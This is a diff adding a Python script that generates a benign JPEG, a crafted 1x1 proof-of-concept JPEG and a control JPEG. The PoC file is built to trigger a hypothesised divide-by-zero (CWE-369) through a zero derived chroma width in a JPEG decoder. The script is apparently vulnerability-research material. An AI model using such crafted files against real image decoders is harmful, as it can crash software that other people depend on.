@@ -1,0 +1,269 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# 假设：CWE-369 的除零发生在派生量 chroma_plane_width（或等价的色度/上采样步长分母）上，
+# 而非任何原始头字段显式为 0。
+# 该派生量由合法 SOF0 字段计算：
+#   chroma_plane_width = (image_width * H_chroma) // H_max
+# 或等价地 image_width // (H_max // H_chroma)。
+# 当 image_width=1，Y 的 H=4（合法 1..4），Cb/Cr 的 H=1（合法 1..4）时：
+#   H_max = 4, H_chroma = 1 => chroma_plane_width = 1 // 4 = 0
+# 头解析阶段看到的 width/H 均合法且非零；后续色度平面/上采样步长若以该派生宽度为除数，
+# 则触发整数除零。ctrl 将 Y 的 H 从 4 恢复为 1，使 H_max=1，派生宽度变为 1。
+# 脚本仅用标准库。
+
+import hashlib
+import os
+
+# ----------------------------- JPEG helpers -----------------------------
+
+def be16(x):
+    return bytes(((x >> 8) & 0xFF, x & 0xFF))
+
+def marker(m):
+    return bytes((0xFF, m))
+
+def make_dqt():
+    # DQT, table id 0, 8-bit precision, all quantization values = 1
+    data = bytes([0x00]) + bytes([1] * 64)
+    return marker(0xDB) + be16(len(data) + 2) + data
+
+DC_LUM_BITS = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
+DC_LUM_VALS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
+
+DC_CHR_BITS = [0, 3, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0]
+DC_CHR_VALS = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
+
+AC_LUM_BITS = [0, 2, 1, 3, 3, 2, 4, 3, 5, 5, 4, 4, 0, 0, 1, 0x7D]
+AC_LUM_VALS = [
+    0x01, 0x02, 0x03, 0x00, 0x04, 0x11, 0x05, 0x12,
+    0x21, 0x31, 0x41, 0x06, 0x13, 0x51, 0x61, 0x07,
+    0x22, 0x71, 0x14, 0x32, 0x81, 0x91, 0xA1, 0x08,
+    0x23, 0x42, 0xB1, 0xC1, 0x15, 0x52, 0xD1, 0xF0,
+    0x24, 0x33, 0x62, 0x72, 0x82, 0x09, 0x0A, 0x16,
+    0x17, 0x18, 0x19, 0x1A, 0x25, 0x26, 0x27, 0x28,
+    0x29, 0x2A, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39,
+    0x3A, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49,
+    0x4A, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59,
+    0x5A, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
+    0x6A, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79,
+    0x7A, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89,
+    0x8A, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97, 0x98,
+    0x99, 0x9A, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
+    0xA8, 0xA9, 0xAA, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6,
+    0xB7, 0xB8, 0xB9, 0xBA, 0xC2, 0xC3, 0xC4, 0xC5,
+    0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xD2, 0xD3, 0xD4,
+    0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA, 0xE1, 0xE2,
+    0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9, 0xEA,
+    0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8,
+    0xF9, 0xFA,
+]
+
+AC_CHR_BITS = [0, 2, 1, 2, 4, 4, 3, 4, 7, 5, 4, 4, 0, 1, 2, 0x77]
+AC_CHR_VALS = [
+    0x00, 0x01, 0x02, 0x03, 0x11, 0x04, 0x05, 0x21,
+    0x31, 0x06, 0x12, 0x41, 0x51, 0x07, 0x61, 0x71,
+    0x13, 0x22, 0x32, 0x81, 0x08, 0x14, 0x42, 0x91,
+    0xA1, 0xB1, 0xC1, 0x09, 0x23, 0x33, 0x52, 0xF0,
+    0x15, 0x62, 0x72, 0xD1, 0x0A, 0x16, 0x24, 0x34,
+    0xE1, 0x25, 0xF1, 0x17, 0x18, 0x19, 0x1A, 0x26,
+    0x27, 0x28, 0x29, 0x2A, 0x35, 0x36, 0x37, 0x38,
+    0x39, 0x3A, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
+    0x49, 0x4A, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
+    0x59, 0x5A, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68,
+    0x69, 0x6A, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78,
+    0x79, 0x7A, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
+    0x88, 0x89, 0x8A, 0x92, 0x93, 0x94, 0x95, 0x96,
+    0x97, 0x98, 0x99, 0x9A, 0xA2, 0xA3, 0xA4, 0xA5,
+    0xA6, 0xA7, 0xA8, 0xA9, 0xAA, 0xB2, 0xB3, 0xB4,
+    0xB5, 0xB6, 0xB7, 0xB8, 0xB9, 0xBA, 0xC2, 0xC3,
+    0xC4, 0xC5, 0xC6, 0xC7, 0xC8, 0xC9, 0xCA, 0xD2,
+    0xD3, 0xD4, 0xD5, 0xD6, 0xD7, 0xD8, 0xD9, 0xDA,
+    0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7, 0xE8, 0xE9,
+    0xEA, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7, 0xF8,
+    0xF9, 0xFA,
+]
+
+def build_huff(bits, vals):
+    codes = {}
+    code = 0
+    k = 0
+    for length in range(1, 17):
+        for _ in range(bits[length - 1]):
+            codes[vals[k]] = (code, length)
+            k += 1
+            code += 1
+        code <<= 1
+    return codes
+
+HUFF = {
+    "dc0": build_huff(DC_LUM_BITS, DC_LUM_VALS),
+    "dc1": build_huff(DC_CHR_BITS, DC_CHR_VALS),
+    "ac0": build_huff(AC_LUM_BITS, AC_LUM_VALS),
+    "ac1": build_huff(AC_CHR_BITS, AC_CHR_VALS),
+}
+
+def make_dht():
+    specs = [
+        (0x00, DC_LUM_BITS, DC_LUM_VALS),  # DC table 0
+        (0x01, DC_CHR_BITS, DC_CHR_VALS),  # DC table 1
+        (0x10, AC_LUM_BITS, AC_LUM_VALS),  # AC table 0
+        (0x11, AC_CHR_BITS, AC_CHR_VALS),  # AC table 1
+    ]
+    payload = bytearray()
+    for info, bits, vals in specs:
+        payload.append(info)
+        payload.extend(bits)
+        payload.extend(vals)
+    return marker(0xC4) + be16(len(payload) + 2) + bytes(payload)
+
+def make_sof(width, height, comps):
+    # comps: list of (id, H, V, quant_id)
+    payload = bytearray()
+    payload.append(8)              # precision
+    payload.extend(be16(height))
+    payload.extend(be16(width))
+    payload.append(len(comps))
+    for cid, h, v, qid in comps:
+        payload.append(cid)
+        payload.append((h << 4) | v)
+        payload.append(qid)
+    return marker(0xC0) + be16(len(payload) + 2) + bytes(payload)
+
+def make_sos(comps):
+    # comps: list of (id, H, V, quant_id, dc_table, ac_table)
+    payload = bytearray()
+    payload.append(len(comps))
+    for cid, h, v, qid, td, ta in comps:
+        payload.append(cid)
+        payload.append((td << 4) | ta)
+    payload.extend([0x00, 0x3F, 0x00])  # Ss, Se, Ah/Al
+    return marker(0xDA) + be16(len(payload) + 2) + bytes(payload)
+
+class BitWriter:
+    def __init__(self):
+        self.out = bytearray()
+        self.acc = 0
+        self.nbits = 0
+
+    def _flush_byte(self, b):
+        self.out.append(b)
+        if b == 0xFF:
+            self.out.append(0x00)
+
+    def write(self, code, length):
+        for i in range(length - 1, -1, -1):
+            bit = (code >> i) & 1
+            self.acc = (self.acc << 1) | bit
+            self.nbits += 1
+            if self.nbits == 8:
+                self._flush_byte(self.acc)
+                self.acc = 0
+                self.nbits = 0
+
+    def pad(self):
+        if self.nbits:
+            shift = 8 - self.nbits
+            self.acc = (self.acc << shift) | ((1 << shift) - 1)
+            self._flush_byte(self.acc)
+            self.acc = 0
+            self.nbits = 0
+
+    def bytes(self):
+        self.pad()
+        return bytes(self.out)
+
+def encode_scan(width, height, comps, restart_interval, huff):
+    hmax = max(c[1] for c in comps)
+    vmax = max(c[2] for c in comps)
+    mcu_cols = (width + 8 * hmax - 1) // (8 * hmax)
+    mcu_rows = (height + 8 * vmax - 1) // (8 * vmax)
+    total_mcus = mcu_cols * mcu_rows
+
+    bw = BitWriter()
+    mcu_index = 0
+
+    for _row in range(mcu_rows):
+        for _col in range(mcu_cols):
+            for cid, h, v, qid, td, ta in comps:
+                # 所有块都是全零 DCT 块：DC diff=0，AC 立即 EOB。
+                dc_code, dc_len = huff["dc%d" % td][0]
+                ac_code, ac_len = huff["ac%d" % ta][0x00]
+                for _vy in range(v):
+                    for _hx in range(h):
+                        bw.write(dc_code, dc_len)
+                        bw.write(ac_code, ac_len)
+
+            mcu_index += 1
+            if (restart_interval and
+                    mcu_index % restart_interval == 0 and
+                    mcu_index != total_mcus):
+                bw.pad()
+                rst = (mcu_index // restart_interval - 1) % 8
+                bw.out.append(0xFF)
+                bw.out.append(0xD0 + rst)
+
+    return bw.bytes()
+
+def build_jpeg(width, height, comps, restart_interval=None):
+    out = bytearray()
+    out.extend(b"\xFF\xD8")                 # SOI
+    out.extend(make_dqt())
+    out.extend(make_sof(width, height, comps))
+    out.extend(make_dht())
+    if restart_interval:
+        out.extend(marker(0xDD) + be16(4) + be16(restart_interval))
+    out.extend(make_sos(comps))
+    out.extend(encode_scan(width, height, comps, restart_interval, HUFF))
+    out.extend(b"\xFF\xD9")                 # EOI
+
+    data = bytes(out)
+    assert data[:2] == b"\xFF\xD8"
+    assert data[-2:] == b"\xFF\xD9"
+    return data
+
+def write_and_report(role, filename, data):
+    with open(filename, "wb") as f:
+        f.write(data)
+    digest = hashlib.sha256(data).hexdigest()
+    print("[F15_FILE] %s %s %d %s" % (role, filename, len(data), digest))
+
+# ----------------------------- sample generation -----------------------------
+
+def main():
+    print(
+        "[F15_PLAN] 1x1 SOF0 Y=H4/V1, Cb=Cr=H1/V1; "
+        "derived chroma_plane_width=(width*H_chroma)//H_max=0; "
+        "ctrl restores Y H=1 so H_max=1 and derived width=1."
+    )
+
+    # 基线：16x16，4:4:4，所有采样因子 1。
+    benign_comps = [
+        (1, 1, 1, 0, 0, 0),  # Y  : DC0/AC0
+        (2, 1, 1, 0, 1, 1),  # Cb : DC1/AC1
+        (3, 1, 1, 0, 1, 1),  # Cr : DC1/AC1
+    ]
+    benign = build_jpeg(16, 16, benign_comps, restart_interval=None)
+    write_and_report("benign", "benign_16x16_444.jpg", benign)
+
+    # PoC：1x1，Y 水平采样 4，Cb/Cr 水平采样 1。
+    # Hmax=4, H_chroma=1 => 派生色度平面宽度 = 1//4 = 0。
+    poc_comps = [
+        (1, 4, 1, 0, 0, 0),  # Y  : H=4, V=1 -> 0x41
+        (2, 1, 1, 0, 1, 1),  # Cb : H=1, V=1 -> 0x11
+        (3, 1, 1, 0, 1, 1),  # Cr : H=1, V=1 -> 0x11
+    ]
+    poc = build_jpeg(1, 1, poc_comps, restart_interval=None)
+    write_and_report("poc", "poc_1x1_yh4_ch1.jpg", poc)
+
+    # Ctrl：与 PoC 相同尺寸/分量/表，仅将 Y 的 H 从 4 恢复为 1。
+    # Hmax=1, H_chroma=1 => 派生色度平面宽度 = 1//1 = 1。
+    ctrl_comps = [
+        (1, 1, 1, 0, 0, 0),  # Y  : H=1, V=1 -> 0x11
+        (2, 1, 1, 0, 1, 1),  # Cb : H=1, V=1 -> 0x11
+        (3, 1, 1, 0, 1, 1),  # Cr : H=1, V=1 -> 0x11
+    ]
+    ctrl = build_jpeg(1, 1, ctrl_comps, restart_interval=None)
+    write_and_report("ctrl", "ctrl_1x1_yh1_ch1.jpg", ctrl)
+
+if __name__ == "__main__":
+    main()
